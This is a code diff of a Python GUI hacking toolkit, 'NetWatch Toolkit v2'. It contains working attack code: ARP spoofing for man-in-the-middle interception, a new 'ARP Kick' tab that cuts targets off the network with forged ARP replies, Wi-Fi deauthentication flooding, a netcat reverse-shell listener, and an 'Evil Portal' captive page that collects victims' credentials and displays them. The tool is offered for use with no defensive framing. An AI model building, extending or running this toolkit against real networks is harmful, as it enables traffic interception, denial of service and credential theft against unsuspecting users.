@@ -32,8 +32,19 @@ from scapy.all import ARP, Ether, srp, send, RadioTap, Dot11, Dot11Deauth, sendp
 # === Globals ===
 evil_dir = "netwatch_portal"
 os.makedirs(evil_dir, exist_ok=True)
-evil_processes = []
 portal_server = None
+evil_processes = []
+spoofing = False
+kicking = False
+
+def is_root():
+    return os.geteuid() == 0
+
+def get_mac(ip):
+    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=0)
+    for _, r in ans:
+        return r[Ether].src
+    return None
 
 # === Evil Portal Server ===
 class PortalHandler(BaseHTTPRequestHandler):
@@ -70,14 +81,14 @@ def stop_portal_server():
         portal_server.shutdown()
         portal_server = None
 
-# === GUI Setup ===
-if os.geteuid() != 0:
-    print("[!] Run this script as root.")
+# === GUI ===
+if not is_root():
+    print("[!] Please run as root.")
     exit()
 
 root = Tk()
 root.title("NetWatch Toolkit v2")
-root.geometry("950x700")
+root.geometry("1000x700")
 style = ttk.Style()
 style.theme_use("clam")
 style.configure("TNotebook.Tab", background="#222", foreground="#0ff", padding=10)
@@ -85,165 +96,122 @@ style.map("TNotebook.Tab", background=[("selected", "#0ff")])
 notebook = ttk.Notebook(root)
 notebook.pack(expand=1, fill='both')
 
-# === Nmap ===
-tab1 = Frame(notebook, bg="#1e1e2e")
-notebook.add(tab1, text="Nmap Scanner")
-Label(tab1, text="Target IP/Range:", bg="#1e1e2e", fg="#0ff").pack()
+def create_tab(title):
+    tab = Frame(notebook, bg="#1e1e2e")
+    notebook.add(tab, text=title)
+    output = Text(tab, bg="black", fg="lime", height=10)
+    output.pack(expand=1, fill="both", pady=5)
+    return tab, output
+
+# Nmap Scanner
+tab1, nmap_output = create_tab("Nmap")
+Label(tab1, text="Target:", bg="#1e1e2e", fg="#0ff").pack()
 nmap_target = Entry(tab1, width=40)
 nmap_target.pack()
-nmap_output = Text(tab1, bg="black", fg="lime")
-nmap_output.pack(expand=1, fill="both")
-def run_nmap():
-    t = nmap_target.get()
-    if not t: return
-    result = subprocess.getoutput(f"nmap -sS -Pn {t}")
-    nmap_output.delete(1.0, END)
-    nmap_output.insert(END, result)
-Button(tab1, text="Run Nmap", command=run_nmap).pack()
+Button(tab1, text="Scan", command=lambda: threading.Thread(target=lambda: nmap_output.insert(END, subprocess.getoutput(f"nmap -sS -Pn {nmap_target.get()}") + "\n")).start()).pack()
 
-# === ARP Scan ===
-tab2 = Frame(notebook, bg="#1e1e2e")
-notebook.add(tab2, text="ARP Scan")
-Label(tab2, text="Network (CIDR):", bg="#1e1e2e", fg="#0ff").pack()
-arp_range = Entry(tab2, width=40)
-arp_range.pack()
-arp_output = Text(tab2, bg="black", fg="lime")
-arp_output.pack(expand=1, fill="both")
-def scan_arp():
-    ip_range = arp_range.get()
-    pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_range)
+# ARP Scanner
+tab2, arp_output = create_tab("ARP Scan")
+Label(tab2, text="Network CIDR:", bg="#1e1e2e", fg="#0ff").pack()
+arp_target = Entry(tab2, width=40)
+arp_target.pack()
+def arp_scan():
+    pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=arp_target.get())
     ans, _ = srp(pkt, timeout=2, verbose=0)
-    arp_output.delete(1.0, END)
     for _, rcv in ans:
         arp_output.insert(END, f"{rcv.psrc} - {rcv.hwsrc}\n")
-Button(tab2, text="Start ARP Scan", command=scan_arp).pack()
+Button(tab2, text="Scan", command=lambda: threading.Thread(target=arp_scan).start()).pack()
 
-# === ARP Spoofing ===
-tab3 = Frame(notebook, bg="#1e1e2e")
-notebook.add(tab3, text="ARP Spoof")
+# ARP Spoof
+tab3, spoof_output = create_tab("ARP Spoof")
 Label(tab3, text="Target IP:", bg="#1e1e2e", fg="#0ff").pack()
-target_entry = Entry(tab3)
-target_entry.pack()
+target_ip = Entry(tab3); target_ip.pack()
 Label(tab3, text="Gateway IP:", bg="#1e1e2e", fg="#0ff").pack()
-gateway_entry = Entry(tab3)
-gateway_entry.pack()
-
-spoofing = False
-def get_mac(ip):
-    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=0)
-    for _, r in ans:
-        return r[Ether].src
-    return None
-
+gateway_ip = Entry(tab3); gateway_ip.pack()
 def start_spoof():
     global spoofing
     spoofing = True
-    tgt = target_entry.get()
-    gw = gateway_entry.get()
-    def spoof_loop():
-        target_mac = get_mac(tgt)
-        gw_mac = get_mac(gw)
+    tgt = target_ip.get(); gw = gateway_ip.get()
+    def loop():
+        tgt_mac = get_mac(tgt); gw_mac = get_mac(gw)
         while spoofing:
-            send(ARP(op=2, pdst=tgt, psrc=gw, hwdst=target_mac), verbose=0)
+            send(ARP(op=2, pdst=tgt, psrc=gw, hwdst=tgt_mac), verbose=0)
             send(ARP(op=2, pdst=gw, psrc=tgt, hwdst=gw_mac), verbose=0)
+            spoof_output.insert(END, f"Spoofing {tgt} <-> {gw}\n")
             time.sleep(2)
-    threading.Thread(target=spoof_loop, daemon=True).start()
+    threading.Thread(target=loop).start()
+def stop_spoof(): global spoofing; spoofing = False
+Button(tab3, text="Start", command=start_spoof).pack()
+Button(tab3, text="Stop", command=stop_spoof).pack()
 
-def stop_spoof():
-    global spoofing
-    spoofing = False
+# ARP Kick
+tab4, kick_output = create_tab("ARP Kick")
+Label(tab4, text="Target IP:", bg="#1e1e2e", fg="#0ff").pack()
+kick_target = Entry(tab4); kick_target.pack()
+Label(tab4, text="Gateway IP:", bg="#1e1e2e", fg="#0ff").pack()
+kick_gateway = Entry(tab4); kick_gateway.pack()
+def start_kick():
+    global kicking
+    kicking = True
+    target = kick_target.get()
+    def loop():
+        while kicking:
+            send(ARP(op=2, pdst=target, psrc=kick_gateway.get(), hwdst="00:00:00:00:00:00"), verbose=0)
+            kick_output.insert(END, f"Kicked {target}\n")
+            time.sleep(1)
+    threading.Thread(target=loop).start()
+def stop_kick(): global kicking; kicking = False
+Button(tab4, text="Start Kick", command=start_kick).pack()
+Button(tab4, text="Stop Kick", command=stop_kick).pack()
 
-Button(tab3, text="Start Spoof", command=start_spoof).pack()
-Button(tab3, text="Stop Spoof", command=stop_spoof).pack()
+# Traceroute
+tab5, trace_output = create_tab("Traceroute")
+Label(tab5, text="Target:", bg="#1e1e2e", fg="#0ff").pack()
+trace_entry = Entry(tab5); trace_entry.pack()
+Button(tab5, text="Run", command=lambda: threading.Thread(target=lambda: trace_output.insert(END, subprocess.getoutput(f"traceroute {trace_entry.get()}") + "\n")).start()).pack()
 
-# === Traceroute ===
-tab4 = Frame(notebook, bg="#1e1e2e")
-notebook.add(tab4, text="Traceroute")
-Label(tab4, text="Target:", bg="#1e1e2e", fg="#0ff").pack()
-trace_entry = Entry(tab4)
-trace_entry.pack()
-trace_output = Text(tab4, bg="black", fg="lime")
-trace_output.pack(expand=1, fill="both")
-Button(tab4, text="Run Traceroute", command=lambda: trace_output.insert(END, subprocess.getoutput(f"traceroute {trace_entry.get()}"))).pack()
+# Reverse Shell
+tab6, shell_output = create_tab("Reverse Shell")
+Label(tab6, text="LPORT:", bg="#1e1e2e", fg="#0ff").pack()
+lport = Entry(tab6); lport.insert(0, "4444"); lport.pack()
+def start_listener(): threading.Thread(target=lambda: os.system(f"nc -lvnp {lport.get()}")).start()
+Button(tab6, text="Start Listener", command=start_listener).pack()
 
-# === Reverse Shell ===
-tab5 = Frame(notebook, bg="#1e1e2e")
-notebook.add(tab5, text="Reverse Shell")
-Label(tab5, text="LHOST (your IP):", bg="#1e1e2e", fg="#0ff").pack()
-lhost = Entry(tab5)
-lhost.pack()
-Label(tab5, text="LPORT:", bg="#1e1e2e", fg="#0ff").pack()
-lport = Entry(tab5)
-lport.insert(0, "4444")
-lport.pack()
-def start_listener():
-    ip = lhost.get()
-    port = lport.get()
-    subprocess.Popen(["gnome-terminal", "--", "nc", "-lvnp", port])
-Button(tab5, text="Start Listener", command=start_listener).pack()
-
-# === Evil Portal ===
-tab6 = Frame(notebook, bg="#1e1e2e")
-notebook.add(tab6, text="Evil Portal")
-Label(tab6, text="Choose Custom HTML Page:", bg="#1e1e2e", fg="#0ff").pack()
-def choose_html():
-    path = filedialog.askopenfilename(filetypes=[("HTML files", "*.html")])
+# Evil Portal
+tab7, portal_output = create_tab("Evil Portal")
+def select_html():
+    path = filedialog.askopenfilename()
     if path:
         with open(path, "r") as src, open(os.path.join(evil_dir, "index.html"), "w") as dst:
             dst.write(src.read())
-Button(tab6, text="Select HTML File", command=choose_html).pack()
+Button(tab7, text="Select HTML", command=select_html).pack()
+def start_portal(): threading.Thread(target=start_portal_server).start(); portal_output.insert(END, "Portal running...\n")
+def stop_portal(): stop_portal_server(); portal_output.insert(END, "Portal stopped\n")
+Button(tab7, text="Start", command=start_portal).pack()
+Button(tab7, text="Stop", command=stop_portal).pack()
+Button(tab7, text="View Creds", command=lambda: portal_output.insert(END, open(os.path.join(evil_dir, "credentials.txt")).read() if os.path.exists(os.path.join(evil_dir, "credentials.txt")) else "No creds yet\n")).pack()
 
-def start_evil():
-    threading.Thread(target=start_portal_server, daemon=True).start()
-    messagebox.showinfo("Portal", "Evil Portal started on port 8080")
-def stop_evil():
-    stop_portal_server()
-    messagebox.showinfo("Portal", "Stopped. iptables should be cleaned manually.")
-Button(tab6, text="Start Evil Portal", command=start_evil).pack()
-Button(tab6, text="Stop Evil Portal", command=stop_evil).pack()
-
-def show_creds():
-    try:
-        with open(os.path.join(evil_dir, "credentials.txt"), "r") as f:
-            data = f.read()
-        messagebox.showinfo("Captured Credentials", data)
-    except:
-        messagebox.showwarning("No Data", "No credentials captured yet.")
-Button(tab6, text="View Captured Creds", command=show_creds).pack()
-
-# === Deauth ===
-tab7 = Frame(notebook, bg="#1e1e2e")
-notebook.add(tab7, text="Deauth Attack ⚠️")
-Label(tab7, text="Monitor Interface (e.g., wlan0mon):", bg="#1e1e2e", fg="#0ff").pack()
-iface_entry = Entry(tab7)
-iface_entry.pack()
-Label(tab7, text="Target MAC:", bg="#1e1e2e", fg="#0ff").pack()
-target_mac_entry = Entry(tab7)
-target_mac_entry.pack()
-Label(tab7, text="AP MAC:", bg="#1e1e2e", fg="#0ff").pack()
-ap_mac_entry = Entry(tab7)
-ap_mac_entry.pack()
-Label(tab7, text="# of packets:", bg="#1e1e2e", fg="#0ff").pack()
-num_packets_entry = Entry(tab7)
-num_packets_entry.insert(0, "100")
-num_packets_entry.pack()
+# Deauth
+tab8, deauth_output = create_tab("Deauth")
+Label(tab8, text="Monitor Interface:", bg="#1e1e2e", fg="#0ff").pack()
+iface = Entry(tab8); iface.pack()
+Label(tab8, text="Target MAC:", bg="#1e1e2e", fg="#0ff").pack()
+client = Entry(tab8); client.pack()
+Label(tab8, text="AP MAC:", bg="#1e1e2e", fg="#0ff").pack()
+ap = Entry(tab8); ap.pack()
 def send_deauth():
-    iface = iface_entry.get()
-    target = target_mac_entry.get()
-    ap = ap_mac_entry.get()
-    count = int(num_packets_entry.get())
-    pkt = RadioTap()/Dot11(addr1=target, addr2=ap, addr3=ap)/Dot11Deauth()
-    sendp(pkt, iface=iface, count=count, inter=0.1, verbose=1)
-Button(tab7, text="Send Deauth Packets", command=send_deauth).pack(pady=10)
+    pkt = RadioTap()/Dot11(addr1=client.get(), addr2=ap.get(), addr3=ap.get())/Dot11Deauth()
+    sendp(pkt, iface=iface.get(), count=100, inter=0.1)
+    deauth_output.insert(END, "Deauth sent\n")
+Button(tab8, text="Send", command=lambda: threading.Thread(target=send_deauth).start()).pack()
 
-# === Reset / Info ===
-tab8 = Frame(notebook, bg="#1e1e2e")
-notebook.add(tab8, text="Reset")
+# Reset
+tab9, reset_output = create_tab("Reset")
 def reset_all():
-    for w in root.winfo_children():
-        for child in w.winfo_children():
-            if isinstance(child, Entry):
-                child.delete(0, END)
-Button(tab8, text="Reset All Fields", command=reset_all).pack()
+    for tab in root.winfo_children():
+        for child in tab.winfo_children():
+            if isinstance(child, Entry): child.delete(0, END)
+    reset_output.insert(END, "All fields cleared.\n")
+Button(tab9, text="Reset All", command=reset_all).pack()
 
 root.mainloop()
